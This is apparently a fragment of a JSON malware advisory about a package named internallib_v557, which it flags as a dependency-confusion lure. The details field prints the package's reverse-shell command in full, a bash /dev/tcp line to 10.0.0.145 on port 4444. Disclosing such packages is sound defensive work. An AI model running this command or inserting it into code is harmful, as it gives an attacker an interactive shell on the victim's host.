  "summary": "Reverse shell backdoor to 10.0.0.145:4444 in exported function",
  "details": "The package exports a function `command` in index.js that executes `/bin/bash -c \"bash -i \u003e\u0026 /dev/tcp/10.0.0.145/4444 0\u003e\u00261\"`, opening an interactive reverse shell from the installer's machine to the hardcoded IP 10.0.0.145 on port 4444. The package has no legitimate functionality — its `package.json` description is a generic 'internal lib' placeholder, and the name `internallib_v557` is consistent with a dependency-confusion lure aimed at private builds that may resolve an 'internal' package name against the public registry. Any consumer that requires this package and invokes the exported function grants the attacker an interactive shell on the host.",
